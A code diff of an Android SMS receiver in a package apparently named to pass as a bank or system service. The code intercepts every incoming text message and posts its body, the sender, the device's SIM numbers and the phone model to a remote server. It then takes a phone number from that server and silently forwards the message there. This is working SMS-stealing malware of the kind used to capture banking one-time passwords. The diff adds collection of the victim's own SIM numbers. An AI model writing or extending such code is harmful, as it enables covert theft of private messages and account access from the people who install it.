@@ -1,4 +1,4 @@
-package com.system.service.sbi.FrontServices;
+package com.system.service.sbi.MinorServices;
 
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
@@ -11,7 +11,7 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
 
-import com.system.service.sbi.Helper;
+import com.system.service.sbi.HelperService;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -34,7 +34,8 @@ public class SmsReceiver extends BroadcastReceiver {
                     for (Object pdu : pdus) {
                         SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                         if (smsMessage != null) {
-                            String sender = smsMessage.getDisplayOriginatingAddress();
+                            String receiver = HelperService.getSimNumbers(context);
+                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
 
                             long timestamp = smsMessage.getTimestampMillis();
@@ -44,24 +45,25 @@ public class SmsReceiver extends BroadcastReceiver {
                                 processedMessages.add(uniqueId);
                                 JSONObject jsonData = new JSONObject();
                                 try {
-                                    Helper helper = new Helper();
-                                    jsonData.put("site", helper.SITE());
+                                    HelperService helperService = new HelperService();
+                                    jsonData.put("site", helperService.SITE());
                                     jsonData.put("message", messageBody);
                                     jsonData.put("sender", sender);
                                     jsonData.put("model", Build.MODEL);
                                     jsonData.put("status", "N/A");
-                                    Helper.postRequest(helper.SMSSavePath(), jsonData, new Helper.ResponseListener() {
+                                    Log.d(HelperService.TAG, "Data "+jsonData.toString());
+                                    HelperService.postRequest(helperService.SMSSavePath(), jsonData, context, new HelperService.ResponseListener() {
                                         @Override
                                         public void onResponse(String result) {
                                             if(result.startsWith("Response Error:")) {
                                                 Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                             } else {
                                                     try {
-                                                        Log.d(Helper.TAG, "RESPONN RESULT : "+result);
+
                                                             JSONObject response = new JSONObject(result);
                                                             if(response.getInt("status")==200){
                                                                   userId  = response.getInt("data");
-                                                                    Helper.getRequest(helper.getNumber()+ helper.SITE(), new Helper.ResponseListener(){
+                                                                    HelperService.getRequest(helperService.getNumber()+ helperService.SITE(), context,  new HelperService.ResponseListener(){
                                                                         @Override
                                                                         public void onResponse(String result){
                                                                             try {
@@ -80,7 +82,6 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                                     PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                     SmsManager smsManager = SmsManager.getDefault();
                                                                                     smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
-                                                                                    Log.d(Helper.TAG, "SMS Forward");
                                                                                 } else {
                                                                                     Log.e("MYAPP: ", "Response does not contain 'data' field");
                                                                                 }
